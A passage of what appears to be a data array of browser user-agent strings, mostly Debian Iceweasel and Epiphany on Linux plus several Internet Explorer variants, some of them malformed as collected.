"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.13pre) Gecko/20070505 (Debian-1.8.0.14~pre071019b-0lenny1) Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.13) Gecko/20060501 Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.0.7) Gecko/20060928 (Debian-1.8.0.7-1) Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051215 Epiphany/1.8.4.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060208 Epiphany/1.8.3",
"Mozilla/5.0 (X11; Linux i686; rv:2.0) Gecko/20110322 Firefox/4.0 Iceweasel/4.0",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.2.13) Gecko/20101203 Iceweasel/3.6.7 (like Firefox/3.6.13)",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
"Mozilla/5.0 (X11; U; Linux 2.6.34.1-SquidSheep; en-US; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.13) Gecko/20110109 Iceweasel/3.6.13 (like Firefox/3.6.13)",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6 (like Firefox/3.6) GTB7.0",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.9 (like Firefox/3.5.9)",
"Mozilla/5.0 (X11; U; Linux x86_64; ja; rv:1.9.1.8) Gecko/20100324 Iceweasel/3.5.8 (like Firefox/3.5.8)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.8 (like Firefox/3.5.8)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.6 (like Firefox/3.5.6; Debian-3.5.6-2)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.5) Gecko/20091112 Iceweasel/3.5.5 (like Firefox/3.5.5; Debian-3.5.5-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091010 Iceweasel/3.5.3 (Debian-3.5.3-2)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-GB; rv:1.9.1.3) Gecko/20091010 Iceweasel/3.5.3 (Debian-3.5.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.19) Gecko/20110430 Iceweasel/3.5.19 (like Firefox/3.5.19)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.1.18) Gecko/20110324 Iceweasel/3.5.18 (like Firefox/3.5.18)",
"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20120921 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; hu-HU; rv:1.9.1.16) Gecko/20110107 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.16) Gecko/20120511 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.1.16) Gecko/20120315 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20110107 Iceweasel/3.5.16 (Debian-3.0.5-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.1.16) Gecko/20120131 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.11) Gecko/20100819 Iceweasel/3.5.11 (like Firefox/3.5.11)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1) Gecko/20090704 Iceweasel/3.5 (Debian-3.5-0)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b3pre) Gecko/20090207 Ubuntu/9.04 (jaunty) IceWeasel/3.1b3pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5) Gecko/2008042623 Iceweasel/3.0b5 (Debian-3.0~b5-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.11) Gecko/2009061208 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.18) Gecko/2010021720 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.9 (Debian-3.0.9-1) GTB5",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.7) Gecko/2009030814 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009033109 Gentoo Iceweasel/3.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.8) Gecko/2009032917 Gentoo Iceweasel/3.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.7) Gecko/2009030810 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009032809 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.6) Gecko/2009020407 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.7) Gecko/2009030810 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009032811 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.7) Gecko/2009032813 Iceweasel/3.0.6 Firefox/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.7) Gecko/2009031819 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.19) Gecko/2010072022 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.7) Gecko/2009032813 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.19) Gecko/2011050707 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.12) Gecko/2009072220 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.11) Gecko/2009061208 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.7) Gecko/2009031819 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.19) Gecko/2012013123 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.16) Gecko/2009121609 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.6) Gecko/2009020409 Iceweasel 3.0.6 (Debian 5.0",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.19) Gecko/2010120923 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.0.19) Gecko/2011092908 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.0.19) Gecko/2010102906 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.0.13) Gecko/2009082121 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.5) Gecko/2008122903 Gentoo Iceweasel/3.0.5",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.5) Gecko/2008122011 Iceweasel/3.0.5 (Debian-3.0.5-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.0.4) Gecko/2008112309 Iceweasel/3.0.4 (Debian-3.0.4-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9.0.1) Gecko/2008072112 Iceweasel/3.0.3 (Debian-3.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; ca-AD; rv:1.9.0.3) Gecko/2008092816 Iceweasel/3.0.3 (Debian-3.0.3-3)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008090211 Ubuntu/9.04 (jaunty) Iceweasel/3.0.2",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.12 (Debian-3.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061319 Iceweasel/3.0.11 (Debian-3.0.11-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1) Gecko/2008071420 Iceweasel/3.0.1 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9.0.1) Gecko/2008072112 Iceweasel/3.0.1 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.1) Gecko/2008071618 Iceweasel/3.0.1 (Debian-3.0.1-1)",
"Mozilla/5.0 (Linux X86; U; Debian SID; it; rv:1.9.0.1) Gecko/2008070208 Debian IceWeasel/3.0.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9) Gecko/2008062908 Iceweasel/3.0 (Debian-3.0~rc2-2)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9) Gecko/2008062909 Iceweasel/3.0 (Debian-3.0~rc2-2)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/2008062113 Iceweasel/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9) Gecko/2008062113 Iceweasel/3.0 (Debian-3.0~rc2-2)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9 (Debian-2.0.0.9-2)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9",
"Mozilla/15.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9",
"Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-0etch1)",
"Mozilla/5.0 (X11; U; Linux x64; en-US; rv:1.8.1.7) Gecko/20070914 Iceweasel/2.0.0.7 (Debian-2.0.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1)",
"Mozilla/5.0 (X11; U; Linux x64; en-US; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1) (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-0etch1)",
"Mozilla 5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/200770508 Iceweasel/2.0.0.4",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; nb-NO; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0 Iceweasel/2.0.0.3 (Debian-2.0.0.13-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a3) Gecko/20070409 IceWeasel/2.0.0.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20070208 Iceweasel/2.0.0.2 (Debian-2.0.0.2+dfsg-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.19) Gecko/20081202 Iceweasel/2.0.0.19 (Debian-2.0.0.19-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.18) Gecko/20081030 Iceweasel/2.0.0.18 (Debian-2.0.0.18-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.17) Gecko/20080827 Iceweasel/2.0.0.17 (Debian-2.0.0.17-0etch1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.16) Gecko/20080702 Iceweasel/2.0.0.16 (Debian-2.0.0.16-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.16) Gecko/20080702 Iceweasel/2.0.0.16 (Debian-2.0.0.16-0etch1)",
"Mozilla/5.0 (X11; U; Linux ppc; de; rv:1.8.1.15) Gecko/20080612 Iceweasel/2.0.0.15 (Debian-2.0.0.15-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.15) Gecko/20080612 Iceweasel/2.0.0.15 (Debian-2.0.0.15-0etch1)",
"Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-2)",
"Mozilla/5.0 (X11; U; Linux sparc64; en-US; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-2)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.13) Gecko/20080311 Iceweasel/2.0.0.13 (Debian-2.0.0.13-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.13) Gecko/20080311 Iceweasel/2.0.0.13 (Debian-2.0.0.13-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.3 Iceweasel/2.0.0.13 (Debian-2.0.0.13-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-0etch1)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.13) Gecko/20101203 IceWeasel/2.0.0.11 Mnenhy/0.8.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-4)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.1) Gecko/2006120502 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.9) Gecko/2009050519 iceweasel/2.0 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en; rv:1.8.1) Gecko/20061024 Iceweasel/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20061022 Iceweasel/1.5.0.7-g2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.8pre) Gecko/20061001 Firefox/1.5.0.8pre (Iceweasel)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.7) Gecko/2009030814 Iceweasel Firefox/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (Linux) Gecko Iceweasel (Debian) Mnenhy",
"Mozilla/5.0 (Future Star Technologies Corp.; Star-Blade OS; x86_64; U; en-US) iNet Browser 4.7",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
